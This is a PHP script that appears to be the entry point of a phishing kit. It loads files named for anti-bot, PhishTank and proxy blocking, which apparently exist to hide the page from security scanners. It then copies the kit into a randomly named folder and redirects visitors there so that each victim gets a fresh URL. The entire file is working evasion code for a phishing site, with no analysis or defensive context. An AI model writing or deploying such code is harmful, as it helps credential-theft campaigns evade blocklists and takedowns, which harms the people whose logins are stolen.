<?php
/*   
                   
*/
session_start();
include('block/antibot_host.php');
include('block/antibot_ip.php');
include('block/antibot_phishtank.php');
include('block/antibot_userAgent.php');
include('block/antibots.php');
include('block/proxyblock.php');
$random = rand(0,100000).$_SERVER['REMOTE_ADDR'];
$dst		= substr(md5($random), 0, 5);
	
function recurse_copy($src, $dst) {

	$dir = opendir($src);
	$result = ($dir === false ? false : true);

	if ($result !== false) {
		$result = @mkdir($dst);

		if ($result === true) {
			while(false !== ( $file = readdir($dir)) ) { 
				if (( $file != '.' ) && ( $file != '..' ) && $result) { 
					if ( is_dir($src . '/' . $file) ) { 
						$result = recurse_copy($src . '/' . $file,$dst . '/' . $file); 
					} else { 
						$result = copy($src . '/' . $file,$dst . '/' . $file); 
					} 
				} 
			} 
			closedir($dir);
		}
	}

	return $result;
}

$src="block";
recurse_copy( $src, $dst );
header("location:".$dst."");
exit;
?>